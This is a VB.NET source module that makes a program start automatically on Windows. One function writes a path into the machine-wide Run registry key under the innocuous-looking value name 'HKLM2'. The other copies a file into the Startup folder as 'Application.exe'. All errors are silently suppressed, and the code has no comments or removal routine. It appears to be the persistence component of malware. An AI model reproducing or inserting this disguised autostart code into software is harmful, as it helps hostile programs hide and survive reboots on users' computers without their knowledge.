Imports Microsoft.Win32
Imports System.IO
Module Startup
    Private cle As RegistryKey
    Public Function RegStartup(loc As String)
        On Error Resume Next
        cle = Registry.LocalMachine.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
        cle.SetValue("HKLM2", loc)
        cle.Close()
    End Function
    Public Function FoldStartup(loc As String)
        On Error Resume Next
        Dim fle As New FileInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Application" & ".exe")
        If fle.Exists = False Then
            FileCopy(loc, Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Application" & ".exe")
        End If


    End Function
End Module
